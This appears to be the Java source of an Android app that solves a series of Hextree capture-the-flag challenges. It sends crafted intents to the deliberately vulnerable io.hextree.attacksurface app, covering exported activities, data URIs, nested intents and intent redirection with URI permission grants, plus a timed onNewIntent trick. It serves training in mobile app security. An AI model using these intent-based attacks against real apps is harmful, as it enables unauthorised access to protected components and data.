package com.poc.hextree;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import org.w3c.dom.Text;

public class MainActivity extends AppCompatActivity {

    public String packageName = "io.hextree.attacksurface";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        TextView homeText = findViewById(R.id.home_text);
        homeText.setText("welcome from code !!!");

        Button homeButton = findViewById(R.id.button);
        homeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                homeText.setText(" text changes after button click");

                Intent intent = new Intent(MainActivity.this, ImplicitActivity.class);
                startActivity(intent);



            }
        });
    }

    private void flag1Solution(){
//        basic exported activity
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag1Activity"));
        Log.i("first intent", "solution flag 1");
        startActivity(intent);

    }

    private void flag2Solution(){
//        Intent with extras ie action
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag2Activity"));
        Log.i("first intent", "solution flag 2");
        startActivity(intent);
    }

    private  void flag3Solution(){
//        extra data with datauri set
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag3Activity"));
        intent.setData(Uri.parse("https://app.hextree.io/map/android"));
        Log.i("first intent", "solution flag 3");
        startActivity(intent);
    }

    private void flag5Solution(){
//        Intent in Intent: prequel to Intent redirection
        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent3.putExtra("reason","back");

        Intent intent2 = new Intent();
        intent2.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent2.putExtra("return",42);
        intent2.putExtra("nextIntent", intent3);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent.putExtra("android.intent.extra.INTENT",intent2);
        startActivity(intent);

    }

    private void flag6Solution(){
//        Intent in intent but intent redirection rather.

//        should point to the component you want to redirect to.
        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName(packageName,packageName+".activities.Flag6Activity"));
        intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent3.putExtra("reason","next");

        Intent intent2 = new Intent();
        intent2.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent2.putExtra("return",42);
        intent2.putExtra("nextIntent", intent3);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
        intent.putExtra("android.intent.extra.INTENT",intent2);
        Log.i("Intent Redirection",Utils.dumpIntent(this,intent));
        startActivity(intent);
    }

    private void flag7Solution() {
//        Activity life cycle tricks. ie delay to simulate a user action
//        meant to reach OnNewIntent of the victim apps lifecycle

        Intent openIntent = new Intent();
        openIntent.setComponent(new ComponentName(packageName, packageName + ".activities.Flag7Activity"));
        openIntent.setAction("OPEN");
        openIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Start the activity
        startActivity(openIntent);

        // Step 2: Delay to simulate user interaction or lifecycle processing
        new Handler().postDelayed(() -> {
            // Step 3: Create the "REOPEN" intent to trigger onNewIntent()
            Intent reopenIntent = new Intent();
            reopenIntent.setComponent(new ComponentName(packageName, packageName + ".activities.Flag7Activity"));
            reopenIntent.setAction("REOPEN");
            reopenIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // Ensure it's handled by the same instance
            startActivity(reopenIntent);
        }, 2000); // 2-second delay
    }

}